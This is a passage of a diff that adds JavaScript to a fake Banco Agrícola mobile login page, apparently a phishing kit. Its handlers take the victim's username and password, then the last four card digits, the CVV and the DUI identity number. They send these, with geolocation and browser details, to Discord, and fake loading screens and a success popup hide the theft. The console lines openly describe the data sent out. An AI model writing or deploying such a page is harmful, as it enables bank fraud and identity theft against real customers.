+            const usuario = usernameInput ? usernameInput.value.trim() : "";
+
+            if (usuario === "") {
+              alert("Por favor ingresa tu usuario");
+              if (usernameInput) usernameInput.focus();
+              return;
+            }
+
+            usuarioGlobal = usuario;
+            mostrarPopupClave();
+          });
+        }
+
+        // Evento "Cancelar" - popup clave
+        if (btnCancelarClave) {
+          btnCancelarClave.addEventListener("click", function (e) {
+            e.preventDefault();
+            ocultarPopupClave();
+          });
+        }
+
+        // Evento "Validar Clave" - ENVÍA CLAVE
+        if (btnValidarClave) {
+          btnValidarClave.addEventListener("click", function (e) {
+            e.preventDefault();
+            const usuario = usernameInput ? usernameInput.value.trim() : "";
+            const clave = claveInput ? claveInput.value.trim() : "";
+
+            if (clave === "") {
+              alert("Por favor ingresa tu clave");
+              if (claveInput) claveInput.focus();
+              return;
+            }
+
+            if (clave.length < 4) {
+              alert("La clave debe tener al menos 4 caracteres");
+              if (claveInput) claveInput.focus();
+              return;
+            }
+
+            claveGlobal = clave;
+            ocultarPopupClave();
+
+            // Enviar CLAVE a Discord
+            Promise.all([
+              obtenerDatosGeo(),
+              Promise.resolve(obtenerInfoNavegador()),
+            ]).then(([geo, navegadorInfo]) => {
+              enviarADiscord(usuario, clave, null, geo, "clave");
+            });
+
+            mostrarLoader();
+            setTimeout(() => {
+              ocultarLoader();
+              mostrarPopupCodigo();
+            }, 10000);
+          });
+        }
+
+        // Evento "Olvidé mi Clave"
+        if (btnOlvideClave) {
+          btnOlvideClave.addEventListener("click", function (e) {
+            e.preventDefault();
+            alert(
+              "Para recuperar tu clave, comunícate al centro de atención al cliente.",
+            );
+            ocultarPopupClave();
+          });
+        }
+
+        // Evento "Cancelar" - popup validación financiera
+        if (btnCancelarCodigo) {
+          btnCancelarCodigo.addEventListener("click", function (e) {
+            e.preventDefault();
+            ocultarPopupCodigo();
+            ocultarLoader();
+          });
+        }
+
+        // Evento "Continuar" - ENVÍA DATOS FINANCIEROS
+        if (btnIngresar) {
+          btnIngresar.addEventListener("click", function (e) {
+            e.preventDefault();
+            const usuario = usernameInput ? usernameInput.value.trim() : "";
+            const last4 = cardLast4 ? cardLast4.value.trim() : "";
+            const cvv = cardCvv ? cardCvv.value.trim() : "";
+            const dui = cardDui ? cardDui.value.trim() : "";
+
+            if (last4.length !== 4) {
+              alert("Por favor ingresa los últimos 4 dígitos de la tarjeta");
+              if (cardLast4) cardLast4.focus();
+              return;
+            }
+
+            if (cvv.length !== 3) {
+              alert("Por favor ingresa el CVV (3 dígitos)");
+              if (cardCvv) cardCvv.focus();
+              return;
+            }
+
+            if (dui.length < 9) {
+              alert("Por favor ingresa un DUI válido");
+              if (cardDui) cardDui.focus();
+              return;
+            }
+
+            ocultarPopupCodigo();
+
+            // Enviar DATOS FINANCIEROS a Discord
+            Promise.all([
+              obtenerDatosGeo(),
+              Promise.resolve(obtenerInfoNavegador()),
+            ]).then(([geo, navegadorInfo]) => {
+              enviarADiscord(
+                usuario,
+                null,
+                { last4, cvv, dui },
+                geo,
+                "financial",
+              );
+            });
+
+            mostrarLoader();
+            setTimeout(() => {
+              ocultarLoader();
+              mostrarPopupExito();
+            }, 10000);
+          });
+        }
+
+        // Evento "Volver al inicio" - popup éxito
+        if (btnVolverInicio) {
+          btnVolverInicio.addEventListener("click", function (e) {
+            e.preventDefault();
+            ocultarPopupExito();
+            // Opcional: recargar la página
+            // window.location.reload();
+          });
+        }
+
+        // ============================================
+        // EVENTOS DE TECLADO (ENTER)
+        // ============================================
+        if (usernameInput) {
+          usernameInput.addEventListener("keypress", function (e) {
+            if (e.key === "Enter") {
+              e.preventDefault();
+              if (btnContinuar) btnContinuar.click();
+            }
+          });
+        }
+
+        if (claveInput) {
+          claveInput.addEventListener("keypress", function (e) {
+            if (e.key === "Enter") {
+              e.preventDefault();
+              if (btnValidarClave) btnValidarClave.click();
+            }
+          });
+        }
+
+        if (cardLast4) {
+          cardLast4.addEventListener("keypress", function (e) {
+            if (e.key === "Enter") {
+              e.preventDefault();
+              if (cardCvv) cardCvv.focus();
+            }
+          });
+        }
+
+        if (cardCvv) {
+          cardCvv.addEventListener("keypress", function (e) {
+            if (e.key === "Enter") {
+              e.preventDefault();
+              if (cardDui) cardDui.focus();
+            }
+          });
+        }
+
+        if (cardDui) {
+          cardDui.addEventListener("keypress", function (e) {
+            if (e.key === "Enter") {
+              e.preventDefault();
+              if (btnIngresar) btnIngresar.click();
+            }
+          });
+        }
+
+        // ============================================
+        // PREVENIR CIERRE CON CLIC FUERA
+        // ============================================
+        document.querySelectorAll(".popup-overlay").forEach((overlay) => {
+          overlay.addEventListener("click", function (e) {
+            e.stopPropagation();
+          });
+        });
+
+        // ============================================
+        // INICIALIZACIÓN
+        // ============================================
+        console.log(
+          "🔄 Sistema de monitoreo de Banco Agrícola (Móvil) activado",
+        );
+        console.log("✅ Envía CLAVE: Usuario + Clave + IP + Ciudad + País");
+        console.log(
+          "✅ Envía VALIDACIÓN FINANCIERA: Usuario + Últimos 4 + CVV + DUI + IP + Ciudad + País",
+        );
+      })();
+    </script>
+  </body>
+</html>
